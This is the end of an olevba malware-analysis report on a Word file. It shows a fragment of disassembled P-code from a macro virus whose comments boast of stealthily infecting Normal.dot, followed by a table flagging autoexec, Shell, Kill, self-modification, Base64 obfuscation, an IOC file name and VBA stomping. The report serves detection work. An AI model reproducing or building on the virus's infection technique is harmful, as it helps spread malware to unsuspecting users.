' Line #382:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #383:
' 	EndIfBlock 
' Line #384:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #385:
' 	QuoteRem 0x0000 0x003D "First ever used this kind of Stealth. Infects Normal.Dot when"
' Line #386:
' 	QuoteRem 0x0000 0x0042 "it's ReadOnly too (immediatly, the first time you load an infected"
' Line #387:
' 	QuoteRem 0x0000 0x0008 "Document"
' Line #388:
' 	QuoteRem 0x0000 0x003E "Written by Flitnic, member of [S o S] No Payload included yet!"
' Line #389:
' 	Label NoNormal 
' Line #390:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

